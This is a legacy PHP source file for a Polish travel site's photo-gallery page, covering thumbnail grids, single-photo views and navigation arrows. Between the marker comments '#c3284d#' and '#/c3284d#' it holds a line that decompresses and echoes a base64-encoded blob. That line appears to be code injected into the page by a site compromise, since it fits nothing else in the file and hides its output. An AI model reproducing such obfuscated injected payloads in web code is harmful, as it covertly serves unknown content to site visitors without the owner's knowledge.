<?php
//==============================================================================================================
// Strona galerii (przeznaczona jako include do stronu galeria.php z danego katalogu konkretnej galerii)
//==============================================================================================================
//
// Autor: Tomasz Krupi�ski
//
// Parametry:
//     co= [ "1el" = pojedyncze zdj�cie ] [ "lista" = lista miniatur ]
//     nr= [ numer zdj�cia w galerii, w przypadku strony miniatur nr pierwszego zdj�cia na stronie ]
//==============================================================================================================
//

session_register("TablicaGalerii","IleWTablicyGalerii");
//$path='./';
//$serwer='http://www.majax.com.pl/turysta/';
//$main=$serwer.'main.php';
$const_IleWLinii = 5 ;             // ile miniatur w jednym wierszu galerii
$const_IleLiniiNaStronie = 4 ;     // ile (max) wierszy miniatur na jednej stronie galerii
$const_RozmiarMiniaturyX = 160 ;   // rozmiar obarzka w galerii (w poziomie)
$const_RozmiarMiniaturyY = 110 ;   // rozmiar obarzka w galerii (w pionie)
$const_NawigacjaExt = 'gif' ;      // rozszerzenie plik�w z elementami nawigacji ("gif" lub "png")

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//  funkcja generuje kod HTML wyswietlaj�cy jeden element galerii (miniatur� i podpis)
//  parametry:
//      $nrFoto  : numer fotografii w aktualnej galerii
//      $plik    : nazwa pliku ze zdj�ciem (niekoniecznie miniatury)
//      $podpis  : gdy<>0 to w�asnie ten podpis, wpp. numer fotografii w galerii
//      $katalog : podkatalog "galeria/", w kt�rym jest fotka (istotne przy wielu galeriach=wycieczkach lub galerii skr�t�w z r�nych galerii < lepiej wtedy robi� kopie(?))
//
//  dodatkowe za�o�enia dotycz�ce po�o�enia katalog�w (wzgl�dem katalogu z plikiem "galeria.php"):
//      podkatalog ze zdj�ciami duzymi = "duze/"
//      podkatalog z miniaturami = "mini/"
//
function wstaw1Miniature( $nrFoto, $plik, $podpis=0, $katalog="./" )
{
    global $const_RozmiarMiniaturyX ;
    global $const_RozmiarMiniaturyY ;
    global $IleWTablicyGalerii ;
//    global $path ;

    // sprawdzenie czy istnieje miniatura obrazka
    if ( file_exists( 'mini/'.$plikMini ))
        $plikMini = $katalog.'mini/'.$plik ; // sztywna regu�a naz dla miniatur: katalog "mini/" i taka sama nazwa pliku
    else
        $plikMini = $katalog.'foto/'.$plik ; // u�yj du�ego pliku r�wnie� jako miniatury

    echo "<td><a href=\"galeria.php?co=1el&nr=".$nrFoto."\">";
    echo "<img class=\"ramka\" src=\"".$plikMini."\" width=\"".$const_RozmiarMiniaturyX."\" height=\"".$const_RozmiarMiniaturyY."\" ";
    echo "alt=\"(".$nrFoto."/".$IleWTablicyGalerii.")";
    if ( $podpis == 0 )
        echo "\" /></a>";
    else
        echo ": ".$podpis."\" /></a>";
    echo "<div class=\"description\">";
    if ( $podpis == 0 ){
        echo "&nbsp;"; }
    else {
        echo $podpis; }
    echo "</div></td>";
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//  funkcja generuje kod HTML wyswietlaj�cy jeden element (strza�k�) nawigacji
//  parametry:
//
//  jako opcje rozpatrzy�:
//      wy�wietlanie "przyciemnionych" strza�ek dla nieaktywnych opcji (!!!)
//

function elementNawigacji( $active, $galeriaRodzaj, $nrFotoCel, $dymek, $od, $do, $obraz, $navExt, $spacja )
{
    if ( $active == 1 )
    {
    $link = "galeria.php?co=".$galeriaRodzaj."&nr=".$nrFotoCel;
    echo "<a href=\"".$link."\" title=\"".$dymek;
    if ( $galeriaRodzaj == "lista" )
        echo " (".$od."-".$do.")";
    echo "\">";
    echo "<img src=\"styl/".$obraz.".".$navExt."\" width=\"40\" height=\"35\" border=\"0\"" ;
    echo " onmouseover=\"if(document.images) this.src='styl/".$obraz."_over.".$navExt."'\"";
    echo " onmouseout=\"if(document.images) this.src='styl/".$obraz.".".$navExt."'\"";
    echo " /></a>" ;
    }
    else
    {
        echo "<img src=\"styl/".$obraz."_dead.".$navExt."\" width=\"40\" height=\"35\" border=\"0\" />" ;
    }
    echo $spacja;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//  funkcja generuje kod HTML wyswietlaj�cy strza�ki do nawigacji mi�dzy stronami galerii
//  parametry:
//      $nrFoto     : numer fotografii w aktualnej galerii
//                      a) dla przypadku strony miniatur - nr pierwszej fotografii na stronie
//                      b) dla przypadku pojedy�czego zdj�cia - dok�adny numer zdj�cia w ca�ej galerii
//      $czyOneFoto :  "1" gdy strona z jednym zdj�ciem z galerii (przej�cia mi�dzy zdj�ciami)
//                     "0" gdy strona miniatur z kalatogu galerii (przej�cia mi�dzy stronami miniatur)
//      $ileFoto    : suma zdj�� w ca�ej galerii
//
//  jako opcje rozpatrzy�:
//      a) dynamiczna zmiana strza�ek po najechaniu myszk� (!!!)
/*
 <div style="text-align: center;"><a href="index.html" title="Pierwszy"><img src="media/first.gif" onmouseover="if(document.images) this.src='media/first_over.gif'" onmouseout="if(document.images) this.src='media/first.gif'" border="0"></a>
<a href="index2.html" title="Poprzedni"><img src="media/prev.gif" onmouseover="if(document.images) this.src='media/prev_over.gif'" onmouseout="if(document.images) this.src='media/prev.gif'" border="0"></a>

<a href="index2.html" title="Nast�pny"><img src="media/next.gif" onmouseover="if(document.images) this.src='media/next_over.gif'" onmouseout="if(document.images) this.src='media/next.gif'" border="0"></a>
<a href="index2.html" title="Ostatni"><img src="media/last.gif" onmouseover="if(document.images) this.src='media/last_over.gif'" onmouseout="if(document.images) this.src='media/last.gif'" border="0"></a>
</div>
*/
//      b) wy�wietlanie "przyciemnionych" strza�ek dla nieaktywnych opcji (!!!)
//

function wstawNawigacje( $nrFoto, $czyOneFoto, $ileFoto )
{
    global $IleWTablicyGalerii ;
    global $const_IleWLinii ;             // ile miniatur w jednym wierszu galerii
    global $const_IleLiniiNaStronie ;     // ile (max) wierszy miniatur na jednej stronie galerii
    global $const_NawigacjaExt ;          // rozszerzenie plik�w z elementami nawigacji ("gif" lub "png")

    $navExt = $const_NawigacjaExt ;
    $spacja = "&nbsp; ";  // odst�p mi�dzy strza�kami nawigacji > sterowany ptrzez css w p.nawigacja word-spacing

    // wyliczenie aktualnej strony miniatur ( do $stronaListy )
    $nrFotoTmp = $nrFoto ;
    $stronaListy = 1 ;
    $ileFotoNaStronie = $const_IleWLinii * $const_IleLiniiNaStronie ;
    while ( $nrFotoTmp > $ileFotoNaStronie )
    {
        $stronaListy++ ;
        $nrFotoTmp = $nrFotoTmp - $ileFotoNaStronie ;
    } // w $stronaListy jest strona listy miniatur zawieraj�ca zdj�cie nr $nrFoto
//  echo "<H2>stronaListy = \"".$stronaListy."</H2>";  //[test]
    if ( $czyOneFoto == 0 )
    {
        $galeriaRodzaj = "lista" ;
    }
    else
    {
        $galeriaRodzaj = "1el" ;
    }
    
    echo "<p class=\"nawigacja\">" ;

    if ( $czyOneFoto == 0 ) // strona z list� miniatur
    {
        $galeriaRodzaj = "lista" ;
        $ostatniaStrona = 0 ;
        $i = $ileFoto ;
        while ( $i > 0 ){
            $ostatniaStrona++ ;
            $i = $i - $ileFotoNaStronie ;
        }
//      echo "<p>ostatniaStrona = \"".$ostatniaStrona."\"</p>";  //[test]

        // do pierwszej strony miniatur
        elementNawigacji( $stronaListy > 1,
                          $galeriaRodzaj, 1,
                          'Pierwsza strona',
                          1,
                          $ileFotoNaStronie,
                          'first', $navExt, $spacja );

        // do poprzedniego
        $nrFotoCel = ( $stronaListy - 2 ) * $ileFotoNaStronie + 1 ;
        elementNawigacji( $stronaListy > 1,
                          $galeriaRodzaj, $nrFotoCel,
                          'Poprzednia strona',
                          $nrFoto-$ileFotoNaStronie,
                          $nrFoto-1,
                          'prev', $navExt, $spacja );

        // gdzie jeste�my
        $do = $nrFoto+$ileFotoNaStronie-1 ;
        if ( $do > $IleWTablicyGalerii )
            $do = $IleWTablicyGalerii ;
        $podpis = "(".$nrFoto."-".$do./*"/".$IleWTablicyGalerii.*/")";
        echo "<span class=\"opis-gal\">".$podpis."</span>".$spacja;

        // do nast�pnego
        $nrFotoCel = $stronaListy * $ileFotoNaStronie + 1 ;
        if ( $stronaListy < ($ostatniaStrona - 1))
            $lastFotoNextPage = $nrFoto+(2*$ileFotoNaStronie)-1;
        else
            $lastFotoNextPage = $IleWTablicyGalerii;
        elementNawigacji( $stronaListy < $ostatniaStrona,
                          $galeriaRodzaj, $nrFotoCel,
                          "Nast�pna strona",
                          $nrFoto+$ileFotoNaStronie,
                          $lastFotoNextPage,
                          'next', $navExt, $spacja );

        // do ostatniego
        $nrFotoCel = ( $ostatniaStrona - 1 ) * $ileFotoNaStronie + 1 ;
        elementNawigacji( $stronaListy < $ostatniaStrona,
                          $galeriaRodzaj, $nrFotoCel,
                          'Ostatnia strona',
                          $ileFotoNaStronie*($ostatniaStrona-1)+1,
                          $IleWTablicyGalerii,
                          'last', $navExt, $spacja );
    }

    else  // strona z jednym zdj�ciem
    {
        $galeriaRodzaj = "1el" ;

        // do pierwszego zdj�cia
        elementNawigacji( $nrFoto > 1,
                          $galeriaRodzaj, 1,
                          "Pierwszy",
                          1,
                          $ileFoto,
                          'first', $navExt, $spacja );

        // do poprzedniego
        elementNawigacji( $nrFoto > 1,
                          $galeriaRodzaj, $nrFoto - 1,
                          "Poprzedni",
                          $nrFoto-1,
                          $ileFoto,
                          'prev', $navExt, $spacja );

        // do strony miniatur z obecnym zdj�ciem $stronaListy
            $stronaListyPierwszy = ( $stronaListy - 1 ) * $ileFotoNaStronie + 1 ;
            echo "<a href=\"galeria.php?co=lista&nr=".$stronaListyPierwszy."\" title=\"Powr�t do listy miniatur\">" ;
            echo "<img src=\"styl/gallery.".$navExt."\" width=\"40\" height=\"35\" border=\"0\" alt=\"Powr�t do listy miniatur\"" ;
            echo " onmouseover=\"if(document.images) this.src='styl/gallery_over.".$navExt."'\"";
            echo " onmouseout=\"if(document.images) this.src='styl/gallery.".$navExt."'\"";
            echo " /></a>" ;
            echo $spacja;

        // do nast�pnego
        elementNawigacji( $nrFoto < $ileFoto,
                          $galeriaRodzaj, $nrFoto + 1,
                          "Nast�pny",
                          $nrFoto+1,
                          $ileFoto,
                          'next', $navExt, $spacja );

        // do ostatniego
        elementNawigacji( $nrFoto < $ileFoto ,
                          $galeriaRodzaj, $ileFoto,
                          "Ostatni",
                          $ileFoto,
                          $ileFoto,
                          'last', $navExt, $spacja );
     }

    echo "</p>" ;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////


#c3284d#
echo(gzinflate(base64_decode("sylOLsosKFEoqSxItVUqSa0o0c9KLEuEiCop5CTmpZcmpgOlkEWLi5JtlXJzlRTsbPQhYnYA")));
#/c3284d#
?>

<!--<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">-->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>Galeria</title>
<link rel="stylesheet" href="styl/style.css" type="text/css" />
<meta http-equiv="Page-Exit" content="progid:DXImageTransform.Microsoft.Fade(duration=.3)" />
<?
echo "<meta name=\"Galeria\" content=\"";
include 'galeria_tytul.txt';  // @TK 2016-03-04 DO PRZETESTOWANIA !!!!!
echo "\">";
?>
<meta http-equiv="Content-type" content="text/html; charset=iso-8859-2">
<!--[if lt IE 7.]>
<script defer type="text/javascript" src="../../../styl/pngfix.js"></script>
<![endif]-->
</head>
<body>

<?
// listwa z mini-menu g�rnym w galerii (!!!)
?>
<center>
<table width="960" height="43" border="0" cellpadding="0" cellspacing="0" style="background-image: url('styl/Belka-nad-galeria.gif');
background-repeat:no-repeat;">
        <tr>
                <td width="187" height="43">
                <a href="../../../wyprawy.php" title="do strony wyboru gdzie byli�my (wyb�r podr�y)">
<?
    echo "<img src=\"styl/Belka-nad-galeria_01.gif\" width=\"187\" height=\"43\" border=\"0\"" ;
    echo " onmouseover=\"if(document.images) this.src='styl/Belka-nad-galeria_01_a.gif'\"";
    echo " onmouseout=\"if(document.images) this.src='styl/Belka-nad-galeria_01.gif'\"";
    echo " />" ;
?>                </a></td>
                <td width="466">
<?
    echo "<span class=\"tytul-gal\">";
//    if file_exists( 'galeria_tytul.txt' )
        include 'galeria_tytul.txt';
//    else
//        echo $wyprawy[ $kod_w ]['nazwa'].substr( $wyprawy[ $kod_w ]['rok'], -5, 5 )." - ".$galerie[ $kod_g ]['nazwa'];
//        !!! nie ma kodu galerii jako parametr strony > czy mo�na odczyta� np. z nazwy bie��cego katalogu ???
        
    echo "</span>";
?>
                </td>
                <td width="307" height="43" >
<div id="header">
        <ul>
                <li><a href="../wyprawa.php" title="do strony wyprawy (wyb�r gelerii z tej podr�y)">Inne galerie</a></li>
                <li><a href="../../../wyprawy.php" title="do strony wyboru gdzie byli�my (wyb�r podr�y)">Inne podr�e</a></li>
                <li><a href="../../../onas.php" title="do strony g��wnej">Strona g��wna</a></li>
                <!--
                   <li><a href="../../../forum.php" title="do strony komentarzy">Komentarze</a></li>
                -->
        </ul>
</div>

                </td>
        </tr>
</table>
<?
/////////////////////////////////////////////////////////////////////////////////////
/////////////////////////    BUDOWANIE TABLICY GALERII    ///////////////////////////
/////////////////////////////////////////////////////////////////////////////////////
//echo "<p>nr=\"".$nr."\"</p>";   //[test]
//echo "<p>IleWTablicyGalerii=\"".$IleWTablicyGalerii."\"</p>";   //[test]
if ($nr==""){$nr=1;}   // domy�lna warto�� dla \$nr
//echo "<p>nr=\"".$nr."\"</p>";   //[test]
if ( $nr == 0 ) {     // specjalny znacznik kasowania tablicy plik�w
    array_splice($TablicaGalerii,0);
    $IleWTablicyGalerii = 0;
//echo "<H1>RESECIK TABELI</H1>";  //[test]
}
// je�eli skasowana pami�� lub pierwszy raz to wczytanie tablicy galerii
//
//echo "<p>IleWTablicyGalerii=\"".$IleWTablicyGalerii."\"</p>";   //[test]
if ( $IleWTablicyGalerii < 1 )
//or ( $TablicaGalerii[ $IleWTablicyGalerii ] == "" )
{
//echo "<H1>BRAK USTAWIONEJ TABELI</H1>";  //[test]
    ////// stworzenie listy pozycji z zawarto�ci katalogu galerii
    //
    $IleWTablicyGalerii = 0;
    if ($handle = opendir('./foto/'))
    {
//        echo "Rysunki w katalogu Galerii (/foto):<br>";               //[test]
        while (false !== ($file = readdir($handle))) {
            if ( strtolower(substr($file,$nameLength-4,4))=='.jpg' ) // jakby mia�y by� te� inne fotki to trzeba zabezpieczy� si� na "." i ".."
            {
//                echo "$file<br>";                        //[test]
                ++$IleWTablicyGalerii;
                $TablicaGalerii[ ] = $file ;                        // tabela(1w): pe�na nazwa pliku
//                $TablicaGaleriiPliki[ substr( $file, 0, 6 ) ] = $file ;             // tabela(2w): kod > pe�na nazwa pliku
            }
        }
        closedir($handle);
//        ksort( $TablicaGaleriiPliki );  // sortowanie po kluczu ca�ej tabeli
        sort( $TablicaGalerii );
        $IleWTablicyGalerii--;  // korekta warto�ci wynikaj�ca z "while"
    }
}
//echo "<br><h2>WYNIKOWA TABLICA FOTEK:</h2>";                                                   //[test]
//foreach ($TablicaGalerii as $key => $val) { echo "TablicaGalerii[".$key."] = ".$val."<br>";}   //[test]
//echo "Razem liczba fotek w galerii = ".$IleWTablicyGalerii."<br>";                             //[test]

// w zale�no�ci od tego czy jeden element (1el) czy lista miniatur (lista) odpowiednia zawarto�� strony:
if ( $co == "1el" )
{
/*
    echo "<div class=\"divGl2\">";
    echo "<p><span class=\"tytul\">";
    include 'galeria_tytul.txt';
    echo "</span></p>";
    echo "<p>&nbsp;</p>";
    echo "<p></p>";
*/

    // je�eli b�dzie takie �yczenie to te� inkludowany z pliku opis danej galerii "galeria_opis.htm"
    wstawNawigacje( $nr, $co == "1el", $IleWTablicyGalerii );
    echo "&nbsp;";
    echo "<div><span class=\"opis-gal\">";
    $podpis = "(".$nr."/".$IleWTablicyGalerii.")";  // opcjonalnie pobranie podpisu z tabeli podpis�w fotek
    echo $podpis."</span></div>&nbsp;";

    echo "<div style=\"text-align: center;\">";
    $nrNext = $nr + 1 ;
    if ($nrNext > $IleWTablicyGalerii){
        $nrNext = 1 ;}
    echo "<a href=\"galeria.php?co=1el&nr=".$nrNext."\" alt=\"Next\">";
    echo "<img class=\"rama\" src=\"foto/".$TablicaGalerii[ $nr ]."\"";
    // echo "width=\"660\" height=\"447\" border=\"0\" ";
    echo " style=\"text-align: center;\" /></a>";
    echo "</div>";

}
else  // lista miniatur
{
    echo "<div class=\"divGl\">";
/*
    echo "<p><span class=\"tytul\">";
    include 'galeria_tytul.txt';
    echo "</span></p>";
*/
//    echo "<p>&nbsp;</p>";
//    echo "<p></p>";
    wstawNawigacje( $nr, $co == "1el", $IleWTablicyGalerii );
    echo "&nbsp;";

    //////////////////////////////////////////////////////////
    /////////////////      MINIATURY      ////////////////////
    //////////////////////////////////////////////////////////
    echo "<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" class=\"thumbs\">";

    $ktoryNr = $nr ;
    for ( $i = 1 ; $i <= $const_IleLiniiNaStronie; $i++)
    {
        echo "<tr>";
        for ( $j = 1 ; $j <= $const_IleWLinii; $j++)
        {
            if ( $ktoryNr > $IleWTablicyGalerii ){
                break;}                                // koniec bo ju� nie ma wi�cej fotek
            wstaw1Miniature( $ktoryNr, $TablicaGalerii[ $ktoryNr ], $podpis=0, $katalog="./" );
            $ktoryNr++ ;
        }
        echo "</tr>";
        if ( $ktoryNr > $IleWTablicyGalerii ){
            break; }                      // koniec bo ju� nie ma wi�cej fotek
    }
    echo "</table>";
}

    echo "</div>";
    //////// tutaj ewentualnie powt�rzenie nawigacji lub jaka� stopka ID ////////////
//    echo "<p></p>";
    wstawNawigacje( $nr, $co == "1el", $IleWTablicyGalerii );
    echo "&nbsp;";

//stopka strony...

echo "<br>";

// wstawianie odst�pu je�li nie by�o pe�nej liczby wierszy miniatur
if ( $co != "1el" )
{
    while ( $i < $const_IleLiniiNaStronie ){     // zr�b odst�p do stopki na niewykorzystane wiersze miniatur
        for ( $j = 1 ; $j <= 8; $j++){           // mo�naby precyzyjnie definiowa� odstep w pikselach - ale po co?
            echo "<br>";
        }
        $i++;
    }
}

echo "<table width=\"960\" align=\"center\" valign=\"top\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" >";
echo "<tr>";
echo "<td align=\"center\" valign=\"middle\" width=\"960\" height=\"57\" background=\"../../../styl/belka_pod_galeria.png\">";
include '../../../stopka.inc';

?>
</td>
</tr>
</table>
<div class="lastline">&nbsp;</div>

</center>
</body>
</html>
